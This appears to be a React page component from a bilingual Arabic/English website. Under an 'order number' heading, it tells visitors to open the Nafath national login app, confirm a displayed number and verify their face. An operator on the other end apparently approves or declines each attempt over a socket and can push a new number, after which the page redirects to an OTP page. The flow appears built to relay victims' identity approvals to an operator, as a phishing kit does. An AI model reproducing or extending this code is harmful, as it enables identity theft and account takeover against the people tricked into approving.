import React, { useEffect, useState } from 'react';
import { TailSpin } from 'react-loader-spinner';
import { useLocation, useNavigate } from 'react-router-dom';
import { socket } from './Main';

const ConfirmOrder = ({mode,checkMode}) => {
    const data = new URLSearchParams(window.location.search)
    const [otp,setOtp] = useState(data.get('otp'))
    const [loading,setLoading]=useState(false)
    const [error,setError] = useState(false)



      const chechValidate = ()=>{
        setError(false)
        setLoading(true)
        socket.emit('orderValidate',otp)
      }

      socket.on('successValidate',(data)=>{
        console.log(data)
        if(data.otp == otp){
          setLoading(false)
          window.location.href='/order_otp'
        }
      })
      socket.on('declineValidate',(data)=>{
        if(data.otp == otp){
          setLoading(false)
          setError(true)
          setOtp(data.new)

        }
      })
  return (
    <div className='flex w-full items-center justify-center min-h-screen flex-col gap-y-4' >
              {
            loading && 
            <div className='absolute top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ' >
    <TailSpin
      height="50"
      width="50"
      color="green"
      ariaLabel="tail-spin-loading"
      radius="1"
      wrapperStyle={{}}
      wrapperClass=""
      visible={true}/>
            </div>
       
        }
        <span className='text-4xl text-green-600 font-bold mb-5'> {checkMode('Order Number','رقم الطلب').word}</span>
        <span className='text-gray-500 font-bold'>فضلا قم باختيار رقم الطلب الظاهر في تطبيق نفاذ</span>
        <div className='flex flex-col justify-center items-center text-gray-500 font-bold gap-1'>
            <span dir={mode === 'ar' ? 'rtl': 'ltr'} >{checkMode('1- Open Navaz App','1- ادخل تطبيق نفاذ').word}</span>
            <span dir={mode === 'ar' ? 'rtl': 'ltr'} >{checkMode('2- Click on “Complete”, then confirm the number that appears','2- اضغط علي اكمال ثم اكدد الرقم الظاهر').word}</span>
            <span dir={mode === 'ar' ? 'rtl': 'ltr'} >{checkMode('3- Prove Interface Image','3- اثبت صورة الوجهه').word}</span>
        </div>
        <span className='min-w-20 my-5 rounded-full min-h-20 bg-gray-300 flex items-center justify-center text-4xl text-white px-3'>
                {otp}
        </span>
        <span className='my-5 text-lg text-red-500 w-full text-center'>{error ?'خطأ في عملية التحقق برجاء اعادة المحاولة باستخدام الرمز الجديد' : ''}</span>
        <div className='flex gap-x-5'>
        <span className='text-white bg-green-500 px-4 text-xl py-1 rounded-md cursor-pointer' onClick={()=>chechValidate()}>تحقق</span>
        </div>
    </div>
  )
}

export default ConfirmOrder